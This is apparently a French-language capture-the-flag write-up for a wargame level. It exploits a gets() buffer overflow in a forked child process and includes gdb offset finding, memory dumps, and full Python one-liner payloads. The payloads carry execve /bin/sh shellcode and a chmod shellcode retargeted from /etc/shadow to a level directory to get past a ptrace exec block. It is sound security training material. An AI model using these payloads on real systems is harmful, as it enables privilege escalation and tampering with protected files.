Quand on RE le binaire, on remarque qu'il n'y a pas d'appel a /bin/sh, mais un gets est présent donc on va pouvoir y injecter notre shellcode. Une partie du programme se déroule dans un child process créé via fork. Avec une string normale on obtient un message "Child is exiting" mais quand on essaie de trouver l'offset avec un générateur de pattern le programme tourne en permanence dans le vide, probablement parce qu'il attend le retour de child qui a planté.

On peut suivre et voir le child process dans gdb avec la commande `set follow-fork-mode child`

Si on relance le programme avec un pattern
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
(gdb) r
Starting program: /home/users/level04/level04
[New process 2913]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2913]
0x41326641 in ?? ()
```

L'offset est à 156

Il reste juste à trouver sur quelle adresse faire pointer EIP. J'ai essayé d'injecter dans le buffer directement mais même problème que la dernière fois le dernier byte se "décale"... Par contre, si on met le payload après l'override d'EIP, ça marche. Pour ça, on regarde l'adresse quand on donne 156 A, l'override d'EIP, puis une nopsled :

```
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd700:     0x41414141      0x41414141      0x41414141      0xffffd720
0xffffd710:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd720:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd730:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd740:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd750:     0x90909090      0x90909090      0x90909090      0x90909090
```

On peut faire pointer sur 0xffffd750+.  

`python -c "print 'A' * 156 + '\x60\xd7\xff\xff' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`


```
python -c "print 'A' * 156 + '\x60\xd7\xff\xff' + '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'" | ./level04
Give me some shellcode, k
no exec() for you
```
Effectivement, on peut voir qu'il y a un appel ptrace qui exit si exec() est utilisé, donc il va falloir faire sans cette fonction. On peut juste utiliser la fonction chmod("path/to/file", 777) à la place. Ce shellcode http://shell-storm.org/shellcode/files/shellcode-590.html pointe sur `/etc/shadow`, il suffit de remplacer le path par `/home/users/level05`

Le shellcode ressemble à ça
```
'\x31\xc0\x50\xb0\x0f'
+ '\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74' // la partie avec la string a remplacer
+ '\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80'
```

On utilise le script python que j'ai créé pour avoir la version assembly de la string '/home/users/level05' et on balance le payload

`python -c "print 'A' * 156 + '\x60\xd7\xff\xff' + '\x90' * 500 + '\x31\xc0\x50\xb0\x0f' + '\x68\x65\x6c\x30\x35\x68\x2f\x6c\x65\x76\x68\x73\x65\x72\x73\x68\x6d\x65\x2f\x75\x68\x2f\x2f\x68\x6f' + '\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80'" | ./level04`

On possède désormais les droits d'accès au dossier level05, il suffit de cat le password